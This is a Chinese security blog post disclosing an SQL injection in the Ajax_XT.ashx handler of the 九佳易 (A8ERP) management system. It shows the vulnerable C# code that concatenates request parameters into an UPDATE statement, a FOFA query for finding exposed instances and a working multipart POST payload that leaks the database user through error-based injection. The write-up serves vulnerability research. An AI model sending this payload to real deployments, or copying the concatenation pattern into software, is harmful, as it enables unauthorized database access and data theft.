---
title: "九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞"
source: https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html
asset_dir: assets/九佳易管理系统-ajax_xt.ashx-sql-注入漏洞
---

# 九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/28 08:30
- 247浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

SQL

数据库

授权

---

# 漏洞简介

九佳易管理系统中的 Ajax\_XT.ashx 通用处理程序接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞分析

根据 Service/Ajax\_XT.ashx 的代码引用

```
<%@ WebHandler Language="C#" CodeBehind="Ajax_XT.cs" Class="A8ERP.Ajax_XT" %>
```

找到 Ajax\_XT 相关类的实现逻辑

```
public class Ajax_XT : IHttpHandler, IRequiresSessionState
{
  public void ProcessRequest(HttpContext context)
  {
    context.Response.ContentType = "text/plain";
    string str1 = context.Request["curFlag"].ToString();
    string str2;
    object obj1;
    string str3;
    string str4;
    string str5;
    if ("XT_YJCD_SAVE".Equals(str1)){......}
    ......
    else if ("PicSord".Equals(str1))
{
  DBHelp dbHelp = new DBHelp();
  dbHelp.Open();
  string str30 = context.Request["curSpkh"].ToString().Trim();
  string[] strArray = context.Request["curPxbh"].ToString().Trim().Split(new char[1]
  {
    ','
  });
  StringBuilder stringBuilder = new StringBuilder();
  for (int index = 0; index < strArray.Length; ++index)
    stringBuilder.Append($"update da_sp_pic set pxxh='{(object) (index + 1)}' where spkh='{str30}' and sortid='{strArray[index]}';");
  SqlCommand command = dbHelp.GetCommand(stringBuilder.ToString());
  obj1 = (object) 0;
```

深入探索

漏洞扫描服务

计算机安全

文件大小转换

[![九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞](images/img-001-fac151cd7919.webp)](https://image.mrxn.net/2453adbb8f1644cfba4a53f85eb75b9d.webp)

其中绝大部分都是参数绑定的方式进行传参处理，不存在SQL注入漏洞，少部分是直接参数拼接，如当**curFlag=PicSord**时，参数**curSpkh==>str30** 以及 **curPxbh** 被直接拼接进`$"update da_sp_pic set pxxh='{(object) (index + 1)}' where spkh='{str30}' and sortid='{strArray[index]}';"`sql语句中，无任何过滤或校验就直接执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

深入探索

软件

SQL注入防护

安全研究报告

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式

```
POST /Service/Ajax_XT.ashx HTTP/1.1
Host: a8erp.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="curFlag"

PicSord
------WebKitFormBoundary
Content-Disposition: form-data; name="curPxbh"

1,2
------WebKitFormBoundary
Content-Disposition: form-data; name="curSpkh"

'-1/user--
------WebKitFormBoundary--
```

[![九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞](images/img-002-84cee657ca0d.webp)](https://image.mrxn.net/f6acc4b8ed294f7da5333bdf1d97f080.webp)

成功利用报错注入在响应回显当前数据库用户信息

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
